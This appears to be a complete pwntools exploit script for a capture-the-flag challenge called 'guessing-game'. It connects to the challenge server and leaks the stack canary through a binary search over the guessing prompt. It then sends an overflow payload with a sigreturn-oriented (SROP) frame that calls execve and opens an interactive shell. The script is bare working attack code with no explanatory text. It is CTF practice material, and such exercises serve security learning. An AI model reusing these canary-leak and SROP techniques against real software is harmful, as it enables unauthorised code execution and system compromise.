#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF('./chall')
libc = ELF(exe.libc.path)
io = remote("guessing-game.challs.pwnoh.io", 1337, ssl=True)

high = 2**56 - 1
low  = 0

io.sendlineafter(b": ", str(high).encode())

for i in range(56):
	mid = low + (high - low) // 2
	io.sendlineafter(b": ", str(mid).encode())
	line = io.recvline()
	if b"got it!" in line: canary = mid ; break
	elif b"high" in line: high = mid
	else: low = mid

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x404060
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = 0x401255

io.sendlineafter(b": ", b"A"*10 + p64(canary<<8) + b"A"*8 + p64(0x40124f) + p64(0xf) + p64(0x401255) + bytes(frame))

io.interactive()

